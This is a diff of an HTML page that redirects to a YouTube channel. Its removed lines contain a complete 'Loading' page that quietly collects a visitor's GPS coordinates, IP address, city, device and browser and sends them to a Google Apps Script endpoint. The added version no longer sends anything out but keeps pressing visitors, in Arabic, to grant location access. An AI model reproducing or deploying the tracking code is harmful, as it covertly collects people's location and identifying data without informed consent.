@@ -1,73 +1,107 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>Loading</title>
-</head>
+<title>Location Access Required</title>
+<style>
+  body {
+    font-family: sans-serif;
+    background: #0b0c0e;
+    color: #e8eaf0;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    flex-direction: column;
+    text-align: center;
+  }
 
+  #message-card {
+    background: #13151a;
+    padding: 40px 30px;
+    border-radius: 12px;
+    border: 1px solid #1e2028;
+    max-width: 400px;
+  }
+
+  #message-card h1 {
+    font-size: 1.2rem;
+    margin-bottom: 15px;
+  }
+
+  #message-card p {
+    font-size: 0.9rem;
+    margin-bottom: 20px;
+  }
+
+  #retry-btn {
+    padding: 10px 20px;
+    background: #4fffb0;
+    border: none;
+    border-radius: 8px;
+    cursor: pointer;
+    font-weight: bold;
+  }
+
+  #retry-btn:hover {
+    background: #38c48a;
+  }
+</style>
+</head>
 <body>
 
-<script>
+<div id="message-card">
+  <h1>الرجاء السماح باستخدام الموقع الجغرافي</h1>
+  <p>يحتاج الموقع إلى تحديد موقعك الجغرافي للاستمرار. اضغط على الزر أدناه للسماح بالوصول.</p>
+  <button id="retry-btn">المحاولة مرة أخرى</button>
+</div>
 
+<script>
 const REDIRECT_URL = "https://youtube.com/@mohannad_asas";
 
-/* ضع رابط Apps Script هنا */
-const SAVE_URL = "https://script.google.com/macros/s/AKfycbztlJsWkK4J5l4wRNSdNe7OrKfJRllg29mP8A7707B4CsYg9ZY9UQpPkvesgUBNYZiC5Q/exec";
+// إخفاء الرسالة أثناء المحاولة
+const messageCard = document.getElementById('message-card');
+const retryBtn = document.getElementById('retry-btn');
 
+function requestLocation() {
+    messageCard.style.display = 'none'; // إخفاء البطاقة أثناء طلب الموقع
 
-window.onload = function(){
+    if (!navigator.geolocation) {
+        showMessage("المتصفح الخاص بك لا يدعم تحديد الموقع.");
+        return;
+    }
 
- if (!navigator.geolocation){
-  alert("Geolocation not supported");
-  return;
- }
-
- navigator.geolocation.getCurrentPosition(success,error);
-
-};
-
-
-/* success */
-
-function success(position){
-
- const lat = position.coords.latitude;
- const lon = position.coords.longitude;
-
- fetch("https://ipapi.co/json/")
- .then(res=>res.json())
- .then(data=>{
-
-  const info = {
-
-   lat:lat,
-   lon:lon,
-   country:data.country_name,
-   city:data.city,
-   ip:data.ip,
-   device:navigator.platform,
-   browser:navigator.userAgent
-
-  };
-
-  fetch(SAVE_URL,{
-   method:"POST",
-   body:JSON.stringify(info)
-  });
-
-  window.location.href = REDIRECT_URL;
-
- });
-
+    navigator.geolocation.getCurrentPosition(onSuccess, onError, { enableHighAccuracy: true, timeout: 10000 });
 }
 
+function onSuccess(position) {
+    const latitude = position.coords.latitude;
+    const longitude = position.coords.longitude;
 
-/* error */
+    console.log("Latitude:", latitude, "Longitude:", longitude);
 
-function error(){
- alert("Please allow location access");
+    // إعادة التوجيه بعد الحصول على الموقع
+    window.location.href = REDIRECT_URL;
 }
 
+function onError(error) {
+    let message = "حدث خطأ أثناء تحديد الموقع. يرجى السماح بالوصول.";
+    if(error.code === error.PERMISSION_DENIED) message = "تم رفض الوصول إلى الموقع. الرجاء السماح باستخدام الموقع.";
+    if(error.code === error.POSITION_UNAVAILABLE) message = "الموقع غير متوفر. تحقق من إعدادات جهازك.";
+    if(error.code === error.TIMEOUT) message = "انتهت مهلة الطلب. حاول مرة أخرى.";
+
+    showMessage(message);
+}
+
+function showMessage(msg) {
+    messageCard.style.display = 'block';
+    messageCard.querySelector('p').innerText = msg;
+}
+
+retryBtn.addEventListener('click', requestLocation);
+
+// بدء الطلب عند تحميل الصفحة
+window.onload = requestLocation;
 </script>
 
 </body>
